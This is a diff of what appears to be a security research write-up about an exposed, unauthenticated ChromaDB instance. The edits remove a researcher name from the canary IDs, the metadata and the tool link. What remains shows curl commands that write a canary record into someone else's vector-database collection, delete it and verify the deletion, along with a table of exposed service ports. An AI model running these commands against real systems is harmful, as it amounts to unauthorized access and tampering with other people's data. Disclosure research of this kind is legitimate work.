@@ -96,12 +96,12 @@ React SPA (Vite build, title: "ChromaDB UI"). JS bundle contains hardcoded `http
 | Writing history | 5050 | Full article history | GET /api/writing-history |
 | Admin UI | 8080 | Full browse/manage | GET / |
 
-**Canary UUID:** `nuclide-canary-2026`
+**Canary UUID:** `-canary-2026`
 **Target collection:** `keystone_article_style` (ID: 001c74f8-135d-4455-9ce6-cc096755b649)
 
 Write confirmed: POST /add with 1024-dim zero vector + document returned HTTP 201.
-Delete confirmed: POST /delete {"ids":["nuclide-canary-2026"]} returned {"deleted": 1}.
-Verify confirmed: POST /get {"ids":["nuclide-canary-2026"]} returned {"ids": [], "documents": []} -- absent.
+Delete confirmed: POST /delete {"ids":["-canary-2026"]} returned {"deleted": 1}.
+Verify confirmed: POST /get {"ids":["-canary-2026"]} returned {"ids": [], "documents": []} -- absent.
 
 **Dimension note:** ChromaDB write requires explicit embedding vector. Operator uses 1024-dim embeddings. Zero vector accepted -- write access does not require the operator's embedding model.
 
@@ -122,21 +122,21 @@ curl -s -X POST "$BASE/collections/$COLL/get" \
 curl -s -X POST "$BASE/collections/$COLL/add" \
   -H "Content-Type: application/json" \
   -d '{
-    "ids": ["nuclide-canary-2026"],
+    "ids": ["-canary-2026"],
     "embeddings": ['"$(python3 -c "print('[' + ','.join(['0.0']*1024) + ']')"')'],
-    "documents": ["nuclide canary -- proof of write"],
-    "metadatas": [{"source": "nuclide-research"}]
+    "documents": [" canary -- proof of write"],
+    "metadatas": [{"source": ""}]
   }'
 
 # DELETE -- remove canary
 curl -s -X POST "$BASE/collections/$COLL/delete" \
   -H "Content-Type: application/json" \
-  -d '{"ids": ["nuclide-canary-2026"]}' | jq .
+  -d '{"ids": ["-canary-2026"]}' | jq .
 
 # VERIFY -- confirm deletion
 curl -s -X POST "$BASE/collections/$COLL/get" \
   -H "Content-Type: application/json" \
-  -d '{"ids": ["nuclide-canary-2026"]}' | jq .ids
+  -d '{"ids": ["-canary-2026"]}' | jq .ids
 # Expected: []
 ```
 
@@ -363,4 +363,4 @@ Right now it's a misconfiguration with a novel exploitation path.
 ## Tool Reference
 
 **chromascan** -- unauthenticated ChromaDB enumeration + canary write/delete verification
-https://github.com/nuclide-research/chromascan
+https://github.com/sshpie/chromascan
